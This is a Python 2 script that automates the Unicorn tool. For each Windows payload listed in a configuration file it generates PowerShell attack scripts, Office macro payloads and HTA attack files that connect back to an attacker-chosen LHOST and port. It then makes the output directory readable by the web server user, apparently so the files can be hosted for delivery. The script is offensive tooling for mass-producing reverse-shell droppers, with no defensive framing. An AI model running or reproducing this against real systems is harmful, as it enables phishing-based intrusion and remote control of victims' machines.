# -*- coding: utf-8 -*-
import os
import subprocess
import re
import shutil
import sys
from config_paths import *

main_save_path = main_path+"unicorn/"

def main_directory():
    if os.path.exists(main_save_path):
        shutil.rmtree(main_save_path)
    os.makedirs(main_save_path)

def save_help():
    comando = unicorn_path + "unicorn.py --help > "+ main_save_path + "/help.txt"
    subprocess.check_output(comando, shell=True)

def payloads():
    payloads = {}
    f = open(payloads_path,'r')
    try:
        for line in f:
            linea = line.split(" ")
            if linea[1]:
                payloads[linea[0].strip()] = linea[1].strip()
    except:
        print("Incorrect payloads file: "+payloads_path)
    finally:
        f.close()
        return payloads

def create_dir(directorio):
    create_dir_path = main_save_path + directorio
    if not os.path.exists(create_dir_path):
        print "Creating directory: "+create_dir_path
        os.makedirs(create_dir_path)


def unicorn(payload, lport):
    global LHOST
    comando = unicorn_path + "unicorn.py "+ payload + " "+ LHOST + " " + lport

    try:
        print comando
        print "-------------------------------------------------"
        subprocess.check_output(comando, shell=True)
        os.rename("powershell_attack.txt", main_save_path + payload + ".ps1") #Lo renombra y lo mueve
    except subprocess.CalledProcessError as e:
        print "Couldn't create the payload: "+payload

    comando_macro = comando + " macro"
    try:
        print comando_macro
        print "-------------------------------------------------"
        subprocess.check_output(comando_macro, shell=True)
        os.rename("powershell_attack.txt", main_save_path + payload + "_macro.txt") #Lo renombra y lo mueve
    except subprocess.CalledProcessError as e:
        print "Couldn't create the macro: "+payload

    comando_hta = comando + " hta"
    try:
        print comando_hta
        print "-------------------------------------------------"
        subprocess.check_output(comando_hta, shell=True)
        shutil.copytree("hta_attack", main_save_path + payload)
        shutil.rmtree("hta_attack")
    except subprocess.CalledProcessError as e:
        print "Couldn't create the macro: "+payload


###############
## MAIN PART ##
###############
print ""
print "#################################################"
print "UNICORN:"
if len(sys.argv) > 1:
    if ip_validator(sys.argv[1]):
        LHOST = sys.argv[1]
    else:
        print "Give a correct Ip address"
        exit(-1)
else:
    LHOST = autoLHOST()
    print "Using IP: "+LHOST

main_directory()
save_help()
payloads_dic = payloads()
for payload in payloads_dic.keys():
    lport = payloads_dic[payload]
    if "windows" in payload:
        payload_name = re.search(r'/\w+$', payload)
        directorio = payload.replace(payload_name.group(),"")
        create_dir(directorio)

        print ""
        print "#################################################"
        print "CREATING PAYLOAD: "+payload
        print "-------------------------------------------------"
        unicorn(payload,lport)
        print "_________________________________________________"

os.system("chown www-data -R "+main_save_path)
